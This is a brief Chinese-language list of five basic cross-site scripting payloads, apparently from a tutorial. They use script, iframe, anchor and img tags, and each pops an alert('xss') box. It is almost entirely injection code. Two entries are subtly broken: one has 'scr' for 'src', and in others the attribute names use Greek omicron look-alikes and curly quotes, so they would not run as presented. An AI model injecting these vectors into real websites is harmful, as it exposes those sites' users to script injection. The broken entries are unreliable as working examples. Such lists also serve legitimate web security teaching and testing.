1) 利用基本的script标签来弹窗
<script>alert('xss')</script>

2) 利用iframe标签的src属性来弹窗
<iframe src=javascript:alert('xss')></iframe>

3) 利用标签的href属性来弹窗
<a href=javascript:alert('xss')>Eastmount</a>

4) 利用img标签的onerror事件来弹窗,当装载文档或图像发生错误时触发onerror事件
<img scr=1 οnerrοr=alert('xss')>

5) 利用img标签的onclick事件来弹窗,只要点击鼠标就会触发弹窗事件
<img src=“http://www.baidu.com/img/logo.gif” οnclick=alert('xss')>
